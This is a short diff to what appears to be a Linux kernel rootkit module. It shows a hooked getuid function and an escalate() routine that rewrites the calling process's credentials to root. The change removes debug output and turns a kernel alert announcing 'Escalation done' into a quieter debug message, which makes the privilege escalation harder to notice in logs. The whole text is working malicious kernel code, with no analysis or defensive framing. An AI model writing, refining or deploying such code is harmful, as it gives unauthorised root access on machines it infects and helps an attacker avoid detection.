@@ -20,14 +20,9 @@ int hooked_getuid(void){
 
 void escalate(void){
     struct cred *my_cred;
-    OUR_DEBUG("task: %s\n", current->comm);
-    OUR_DEBUG("uid: %d\n", current->cred->uid);
-    OUR_DEBUG("suid: %d\n", current->cred->suid);
-    OUR_DEBUG("euid: %d\n", current->cred->euid);
-
     my_cred = prepare_creds(); 
     my_cred->uid = my_cred->euid = my_cred->suid = my_cred->fsuid = 0;
     my_cred->gid = my_cred->egid = my_cred->sgid = my_cred->fsgid = 0;
     commit_creds(my_cred);
-    printk(KERN_ALERT "Escalation done.\n");
+    OUR_DEBUG("Escalation done.\n");
 }
